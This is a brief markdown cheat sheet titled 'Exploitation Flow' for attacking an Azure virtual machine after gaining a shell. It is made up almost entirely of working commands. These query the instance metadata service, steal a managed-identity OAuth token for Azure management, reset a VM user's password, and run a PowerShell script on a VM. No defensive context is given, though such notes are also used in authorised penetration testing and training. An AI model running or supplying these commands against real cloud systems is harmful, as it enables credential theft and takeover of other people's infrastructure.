#Exploitation Flow 

### 1. Get shell 

### 2. ```env```

### 3. Metadata 

3.1 Get metadata of the azure vm
```
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```
3.2 Get auth token of managed identity
```
curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
```

VM password reset 
```
az vm user update -u username -p password -n <VM_Name> -g <Resource_Group>
```

VM run command
```
Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1
```
